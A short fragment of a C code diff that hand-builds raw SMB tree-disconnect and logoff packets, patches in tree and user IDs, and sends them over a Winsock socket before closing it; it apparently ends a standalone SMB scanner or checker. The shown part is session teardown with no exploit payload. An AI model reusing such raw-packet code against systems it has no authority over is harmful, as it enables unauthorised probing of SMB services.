+		"\x00\x00\x00\x23\xff\x53\x4d\x42"
+		"\x71\x00\x00\x00\x00\x18\x07\xc0"
+		"\x00\x00\x00\x00\x00\x00\x00\x00"
+		"\x00\x00\x00\x00\x00\x08\xff\xfe"
+		"\x00\x08\x41\x00\x00\x00\x00";
+
+	//Update treeID, UserID
+	memcpy((unsigned char*)disconnect_packet + 28, (char*)&treeid, 2);
+	memcpy((unsigned char*)disconnect_packet + 32, (char*)&userid, 2);
+
+	//send the disconnect packet
+	send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
+	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
+
+
+	unsigned char logoff_packet[] =
+		"\x00\x00\x00\x27\xff\x53\x4d\x42\x74\x00\x00"
+		"\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff"
+		"\xfe\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00";
+
+	//Update treeID, UserID
+	memcpy((unsigned char*)logoff_packet + 28, (char*)&treeid, 2);
+	memcpy((unsigned char*)logoff_packet + 32, (char*)&userid, 2);
+
+	//send the logoff packet
+	send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0);
+	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
 	closesocket(sock);
 	WSACleanup();
+
 	return 0;
 }
